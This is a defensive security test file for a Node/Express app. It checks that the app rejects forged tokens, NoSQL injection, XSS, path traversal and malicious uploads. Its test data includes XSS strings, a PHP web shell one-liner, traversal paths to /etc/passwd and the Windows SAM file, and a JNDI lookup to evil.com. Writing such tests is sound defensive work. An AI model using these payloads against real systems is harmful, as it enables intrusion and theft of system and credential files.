/**
 * Comprehensive Security Testing Suite
 * Tests for various security vulnerabilities and attack vectors
 */
const request = require('supertest');
const mongoose = require('mongoose');
const jwt = require('jsonwebtoken');
const app = require('../../server');
const User = require('../../models/User');
const Organization = require('../../models/Organization');

describe('Comprehensive Security Tests', () => {
  let testOrg;
  let adminUser, regularUser;
  let adminToken, userToken;
  let maliciousToken;

  beforeAll(async () => {
    // Connect to test database
    await mongoose.connect(process.env.MONGODB_TEST_URI || 'mongodb://localhost:27017/autocontrol-test');
    
    // Create test organization
    testOrg = await Organization.create({
      name: 'Security Test Org',
      subdomain: 'securitytest',
      isActive: true,
      subscriptionStatus: 'active'
    });

    const bcrypt = require('bcrypt');
    const hashedPassword = await bcrypt.hash('SecurePassword123!', 10);

    // Create test users
    adminUser = await User.create({
      name: 'Admin User',
      email: 'admin@securitytest.com',
      password: hashedPassword,
      organizationId: testOrg._id,
      role: 'admin',
      isActive: true,
      emailVerified: true
    });

    regularUser = await User.create({
      name: 'Regular User',
      email: 'user@securitytest.com',
      password: hashedPassword,
      organizationId: testOrg._id,
      role: 'user',
      isActive: true,
      emailVerified: true
    });

    // Generate tokens
    const jwtSecret = process.env.JWT_SECRET || 'test-secret';
    
    adminToken = jwt.sign(
      { userId: adminUser._id, organizationId: testOrg._id, role: 'admin' },
      jwtSecret,
      { expiresIn: '1h' }
    );

    userToken = jwt.sign(
      { userId: regularUser._id, organizationId: testOrg._id, role: 'user' },
      jwtSecret,
      { expiresIn: '1h' }
    );

    // Create malicious token with different secret
    maliciousToken = jwt.sign(
      { userId: adminUser._id, organizationId: testOrg._id, role: 'admin' },
      'malicious-secret',
      { expiresIn: '1h' }
    );
  });

  afterAll(async () => {
    // Clean up test data
    await User.deleteMany({});
    await Organization.deleteMany({});
    await mongoose.connection.close();
  });

  describe('Authentication Security Tests', () => {
    test('should reject malicious JWT tokens', async () => {
      const response = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${maliciousToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('Invalid token');
    });

    test('should reject tampered JWT tokens', async () => {
      // Tamper with the token
      const tamperedToken = adminToken.slice(0, -5) + 'XXXXX';
      
      const response = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${tamperedToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
    });

    test('should prevent JWT token reuse after logout', async () => {
      // First, logout
      await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(200);

      // Try to use the same token
      const response = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
    });

    test('should enforce password complexity requirements', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'abc123',
        '12345678',
        'qwerty'
      ];

      for (const weakPassword of weakPasswords) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            name: 'Test User',
            email: `test${Date.now()}@test.com`,
            password: weakPassword,
            organizationId: testOrg._id
          })
          .expect(400);

        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('password');
      }
    });

    test('should prevent brute force attacks', async () => {
      const loginAttempts = [];
      
      // Make multiple failed login attempts
      for (let i = 0; i < 10; i++) {
        loginAttempts.push(
          request(app)
            .post('/api/auth/login')
            .send({
              email: adminUser.email,
              password: 'wrongpassword'
            })
        );
      }

      const responses = await Promise.all(loginAttempts);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('SQL/NoSQL Injection Tests', () => {
    test('should prevent NoSQL injection in login', async () => {
      const maliciousPayloads = [
        { email: { $ne: null }, password: { $ne: null } },
        { email: { $regex: '.*' }, password: { $regex: '.*' } },
        { email: { $where: 'return true' }, password: 'anything' },
        { email: adminUser.email, password: { $ne: null } }
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send(payload)
          .expect(400);

        expect(response.body.success).toBe(false);
      }
    });

    test('should prevent NoSQL injection in queries', async () => {
      const maliciousQueries = [
        { filter: JSON.stringify({ $where: 'return true' }) },
        { filter: JSON.stringify({ organizationId: { $ne: null } }) },
        { search: { $regex: '.*', $options: 'i' } },
        { id: { $ne: null } }
      ];

      for (const query of maliciousQueries) {
        const response = await request(app)
          .get('/api/storage')
          .set('Authorization', `Bearer ${userToken}`)
          .query(query);

        // Should either reject the query or only return organization-specific data
        if (response.status === 200) {
          response.body.data.records.forEach(record => {
            expect(record.organizationId).toBe(testOrg._id.toString());
          });
        } else {
          expect(response.status).toBe(400);
        }
      }
    });

    test('should sanitize input in storage creation', async () => {
      const maliciousInputs = {
        producto: '<script>alert("xss")</script>',
        lote: '"; DROP TABLE storage; --',
        observaciones: '${7*7}{{7*7}}',
        proveedor: '<img src=x onerror=alert(1)>'
      };

      const response = await request(app)
        .post('/api/storage')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          ...maliciousInputs,
          cantidad: 100,
          fechaCaducidad: '2024-12-31'
        })
        .expect(201);

      expect(response.body.success).toBe(true);
      
      // Check that malicious content was sanitized
      const record = response.body.data.record;
      expect(record.producto).not.toContain('<script>');
      expect(record.observaciones).not.toContain('${');
      expect(record.proveedor).not.toContain('<img');
    });
  });

  describe('Cross-Site Scripting (XSS) Tests', () => {
    test('should prevent stored XSS in user input', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/storage')
          .set('Authorization', `Bearer ${userToken}`)
          .send({
            producto: payload,
            lote: `XSS-${Date.now()}`,
            cantidad: 100,
            fechaCaducidad: '2024-12-31'
          })
          .expect(201);

        expect(response.body.success).toBe(true);
        
        // Verify XSS payload was sanitized
        const record = response.body.data.record;
        expect(record.producto).not.toContain('<script>');
        expect(record.producto).not.toContain('javascript:');
        expect(record.producto).not.toContain('onerror');
        expect(record.producto).not.toContain('onload');
      }
    });

    test('should prevent reflected XSS in search parameters', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        '<img src=x onerror=alert(1)>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .get('/api/storage/search')
          .set('Authorization', `Bearer ${userToken}`)
          .query({ q: payload });

        // Response should not contain unescaped payload
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('javascript:');
        expect(responseText).not.toContain('onerror');
      }
    });
  });

  describe('Cross-Site Request Forgery (CSRF) Tests', () => {
    test('should require CSRF token for state-changing operations', async () => {
      // Try to create storage without CSRF token
      const response = await request(app)
        .post('/api/storage')
        .set('Authorization', `Bearer ${userToken}`)
        .set('Origin', 'http://malicious-site.com')
        .send({
          producto: 'CSRF Test Product',
          lote: 'CSRF-001',
          cantidad: 100,
          fechaCaducidad: '2024-12-31'
        });

      // Should either require CSRF token or validate origin
      if (response.status !== 201) {
        expect([400, 403, 422]).toContain(response.status);
      }
    });

    test('should validate request origin', async () => {
      const maliciousOrigins = [
        'http://malicious-site.com',
        'https://evil.com',
        'http://localhost:3001', // Different port
        'null'
      ];

      for (const origin of maliciousOrigins) {
        const response = await request(app)
          .post('/api/storage')
          .set('Authorization', `Bearer ${userToken}`)
          .set('Origin', origin)
          .send({
            producto: 'Origin Test Product',
            lote: `ORIGIN-${Date.now()}`,
            cantidad: 100,
            fechaCaducidad: '2024-12-31'
          });

        // Should validate origin for state-changing operations
        if (process.env.NODE_ENV === 'production') {
          expect([400, 403]).toContain(response.status);
        }
      }
    });
  });

  describe('Authorization and Access Control Tests', () => {
    test('should prevent privilege escalation', async () => {
      // Regular user tries to access admin endpoints
      const adminEndpoints = [
        '/api/admin/users',
        '/api/admin/organizations',
        '/api/admin/system-settings',
        '/api/admin/audit-logs'
      ];

      for (const endpoint of adminEndpoints) {
        const response = await request(app)
          .get(endpoint)
          .set('Authorization', `Bearer ${userToken}`)
          .expect(403);

        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('permission');
      }
    });

    test('should prevent horizontal privilege escalation', async () => {
      // Create another organization and user
      const otherOrg = await Organization.create({
        name: 'Other Organization',
        subdomain: 'otherorg',
        isActive: true,
        subscriptionStatus: 'active'
      });

      const otherUser = await User.create({
        name: 'Other User',
        email: 'other@otherorg.com',
        password: await require('bcrypt').hash('password123', 10),
        organizationId: otherOrg._id,
        role: 'admin',
        isActive: true,
        emailVerified: true
      });

      // Try to access other organization's data
      const response = await request(app)
        .get(`/api/users/${otherUser._id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(404);

      expect(response.body.success).toBe(false);
    });

    test('should prevent direct object reference attacks', async () => {
      // Create a storage record
      const storageResponse = await request(app)
        .post('/api/storage')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          producto: 'Test Product',
          lote: 'TEST-001',
          cantidad: 100,
          fechaCaducidad: '2024-12-31'
        })
        .expect(201);

      const storageId = storageResponse.body.data.record.id;

      // Try to access with manipulated IDs
      const maliciousIds = [
        '../../../etc/passwd',
        '../../admin',
        storageId.slice(0, -1) + '0', // Modified ObjectId
        '000000000000000000000000', // Valid ObjectId format but non-existent
        'null',
        'undefined',
        ''
      ];

      for (const maliciousId of maliciousIds) {
        const response = await request(app)
          .get(`/api/storage/${maliciousId}`)
          .set('Authorization', `Bearer ${userToken}`);

        expect([400, 404]).toContain(response.status);
        if (response.status === 404) {
          expect(response.body.success).toBe(false);
        }
      }
    });
  });

  describe('Input Validation and Sanitization Tests', () => {
    test('should validate file upload security', async () => {
      const maliciousFiles = [
        { filename: '../../../etc/passwd', content: 'malicious content' },
        { filename: 'script.js', content: 'alert("xss")' },
        { filename: 'file.php', content: '<?php system($_GET["cmd"]); ?>' },
        { filename: 'file.exe', content: 'MZ\x90\x00' }, // PE header
        { filename: 'file.svg', content: '<svg onload="alert(1)"></svg>' }
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/storage/import')
          .set('Authorization', `Bearer ${adminToken}`)
          .attach('file', Buffer.from(file.content), file.filename);

        // Should reject dangerous file types or sanitize content
        if (response.status === 200) {
          expect(response.body.success).toBe(true);
          // Verify no malicious content was processed
        } else {
          expect([400, 415]).toContain(response.status);
        }
      }
    });

    test('should prevent path traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get('/api/files/' + encodeURIComponent(payload))
          .set('Authorization', `Bearer ${userToken}`);

        // Should not allow path traversal
        expect([400, 403, 404]).toContain(response.status);
      }
    });

    test('should validate and sanitize all input fields', async () => {
      const maliciousInputs = {
        producto: 'A'.repeat(1000), // Extremely long input
        lote: null, // Null value
        cantidad: 'not-a-number', // Invalid type
        fechaCaducidad: 'invalid-date', // Invalid date
        observaciones: '\x00\x01\x02', // Control characters
        proveedor: '${jndi:ldap://evil.com/a}' // JNDI injection attempt
      };

      const response = await request(app)
        .post('/api/storage')
        .set('Authorization', `Bearer ${userToken}`)
        .send(maliciousInputs)
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.errors).toBeDefined();
      expect(response.body.errors.length).toBeGreaterThan(0);
    });
  });

  describe('Session and Token Security Tests', () => {
    test('should invalidate tokens on password change', async () => {
      // Change password
      await request(app)
        .put('/api/auth/change-password')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          currentPassword: 'SecurePassword123!',
          newPassword: 'NewSecurePassword123!'
        })
        .expect(200);

      // Old token should be invalid
      const response = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
    });

    test('should prevent session fixation attacks', async () => {
      // Login and get token
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: regularUser.email,
          password: 'NewSecurePassword123!'
        })
        .expect(200);

      const newToken = loginResponse.body.data.token;

      // Token should be different from previous ones
      expect(newToken).not.toBe(userToken);
      expect(newToken).not.toBe(adminToken);

      // New token should work
      const meResponse = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${newToken}`)
        .expect(200);

      expect(meResponse.body.success).toBe(true);
    });

    test('should enforce token expiration', async () => {
      // Create short-lived token
      const shortToken = jwt.sign(
        { userId: regularUser._id, organizationId: testOrg._id, role: 'user' },
        process.env.JWT_SECRET || 'test-secret',
        { expiresIn: '1ms' } // Very short expiration
      );

      // Wait for token to expire
      await new Promise(resolve => setTimeout(resolve, 10));

      const response = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${shortToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('expired');
    });
  });

  describe('Rate Limiting and DoS Protection Tests', () => {
    test('should rate limit API requests per user', async () => {
      const requests = [];
      
      // Make many requests quickly
      for (let i = 0; i < 100; i++) {
        requests.push(
          request(app)
            .get('/api/storage')
            .set('Authorization', `Bearer ${userToken}`)
        );
      }

      const responses = await Promise.all(requests);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should prevent large payload attacks', async () => {
      const largePayload = {
        producto: 'A'.repeat(10000),
        lote: 'B'.repeat(10000),
        observaciones: 'C'.repeat(100000)
      };

      const response = await request(app)
        .post('/api/storage')
        .set('Authorization', `Bearer ${userToken}`)
        .send(largePayload);

      // Should reject overly large payloads
      expect([400, 413]).toContain(response.status);
    });
  });

  describe('Information Disclosure Tests', () => {
    test('should not expose sensitive information in error messages', async () => {
      // Try to access non-existent resource
      const response = await request(app)
        .get('/api/storage/000000000000000000000000')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(404);

      // Error message should not reveal internal details
      expect(response.body.message).not.toContain('ObjectId');
      expect(response.body.message).not.toContain('MongoDB');
      expect(response.body.message).not.toContain('database');
      expect(response.body.message).not.toContain('collection');
    });

    test('should not expose stack traces in production', async () => {
      // Trigger an error
      const response = await request(app)
        .post('/api/storage')
        .set('Authorization', `Bearer ${userToken}`)
        .send({ invalid: 'data' })
        .expect(400);

      // Should not expose stack trace
      expect(response.body.stack).toBeUndefined();
      expect(JSON.stringify(response.body)).not.toContain('at ');
      expect(JSON.stringify(response.body)).not.toContain('.js:');
    });

    test('should not expose server information in headers', async () => {
      const response = await request(app)
        .get('/api/health')
        .expect(200);

      // Should not expose server details
      expect(response.headers['server']).toBeUndefined();
      expect(response.headers['x-powered-by']).toBeUndefined();
    });
  });

  describe('Security Headers Tests', () => {
    test('should include security headers in all responses', async () => {
      const response = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);

      // Check for security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['content-security-policy']).toBeDefined();
    });

    test('should set appropriate CORS headers', async () => {
      const response = await request(app)
        .options('/api/storage')
        .set('Origin', 'http://localhost:3000')
        .expect(200);

      expect(response.headers['access-control-allow-origin']).toBeDefined();
      expect(response.headers['access-control-allow-methods']).toBeDefined();
      expect(response.headers['access-control-allow-headers']).toBeDefined();
    });
  });
});